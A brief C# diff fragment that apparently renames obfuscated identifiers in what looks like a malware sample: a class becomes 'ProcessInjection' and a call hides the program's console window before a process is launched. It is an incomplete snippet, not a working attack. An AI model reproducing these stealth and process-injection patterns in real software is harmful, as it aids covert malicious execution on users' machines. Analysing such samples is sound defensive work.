@@ -16,9 +16,9 @@ internal static class Program {
 	[STAThread]
 	private static void _JNpXAQtl22CH9YoBkXPbqOkmi9r()
 	{
-		_KOjvofkzBAzqmEvHRZRNmFojQZH._d2DbtJKY9HneawJSRKefBeKIcNi(
-			_KOjvofkzBAzqmEvHRZRNmFojQZH._F4d2TGYd32CefpAHjoOmnZbgvCkb(), 0);
-		_KOjvofkzBAzqmEvHRZRNmFojQZH._axlrZfcSb8gyZSepzTKbbvUFwkF();
+		ProcessInjection._d2DbtJKY9HneawJSRKefBeKIcNi(
+			ProcessInjection.GetConsoleWindowPtr(), 0);
+		ProcessInjection._axlrZfcSb8gyZSepzTKbbvUFwkF();
 		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
 		string location = default(string);
 
